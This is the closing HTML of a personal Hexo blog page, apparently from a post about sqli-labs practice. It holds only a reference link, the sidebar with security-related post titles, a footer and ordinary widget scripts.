+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/like98k/article/details/79452002">SQLI-LABS修炼笔记</a></p>
+</blockquote>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            notwiner
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>notwiner的小站,notwiner,博客,博客笔记</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/12/03/%E8%BD%AF%E4%BB%B6/">一些软件整理</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/11/30/sqlmap%E5%92%8Csqli-labs/">sqlmap与sqli-labs记录</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/18/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/">sql注入基础</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/08/PHP%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/">PHP学习（一）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">《XSS跨站脚本攻击剖析与防御》读书笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/27/python3%E5%AD%A6%E4%B9%A02/">python3学习（二）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/26/%E6%9D%82%E8%AE%B0/">杂记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/26/Burp/">Burpsuite笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/06/08/%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/">密码学（一）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/05/14/python3%E5%AD%A6%E4%B9%A0/">python3学习（一）</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2020/01/15/sqli-labs%E5%AD%A6%E4%B9%A0/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2020/01/15/sqli-labs%E5%AD%A6%E4%B9%A0/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2020/01/15/sqli-labs%E5%AD%A6%E4%B9%A0/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/Burpsuite/" style="font-size: 11.974854384303065px;" class="tag-cloud-link">Burpsuite</a>
+    
+    <a href="/tags/Git/" style="font-size: 17.686314129505597px;" class="tag-cloud-link">Git</a>
+    
+    <a href="/tags/PHP/" style="font-size: 13.005810174904017px;" class="tag-cloud-link">PHP</a>
+    
+    <a href="/tags/sql/" style="font-size: 19.386790282202966px;" class="tag-cloud-link">sql</a>
+    
+    <a href="/tags/XSS/" style="font-size: 15.068384730749937px;" class="tag-cloud-link">XSS</a>
+    
+    <a href="/tags/hexo/" style="font-size: 9.610717690491814px;" class="tag-cloud-link">hexo</a>
+    
+    <a href="/tags/linux/" style="font-size: 15.300997521766067px;" class="tag-cloud-link">linux</a>
+    
+    <a href="/tags/python3/" style="font-size: 11.51424877753685px;" class="tag-cloud-link">python3</a>
+    
+    <a href="/tags/sqlmap/" style="font-size: 14.9637388310172px;" class="tag-cloud-link">sqlmap</a>
+    
+    <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 13.743880717048956px;" class="tag-cloud-link">上传</a>
+    
+    <a href="/tags/wireshark/" style="font-size: 17.79660212418514px;" class="tag-cloud-link">wireshark</a>
+    
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 9.71365484021764px;" class="tag-cloud-link">笔记</a>
+    
+    <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 17.451876032136326px;" class="tag-cloud-link">密码学</a>
+    
+    <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 18.39260462258275px;" class="tag-cloud-link">编码</a>
+    
+    <a href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" style="font-size: 10.25420733541953px;" class="tag-cloud-link">树莓派</a>
+    
+    <a href="/tags/%E6%8E%98%E5%AE%89CTF/" style="font-size: 11.563922831647547px;" class="tag-cloud-link">掘安CTF</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="https://myau.moe/" target="_blank">gal主题作者</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/wen1ling/" target="_blank">Github</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 notwiner Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true,"width":90,"height":150},"react":{"opacity":0.8}});</script></body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
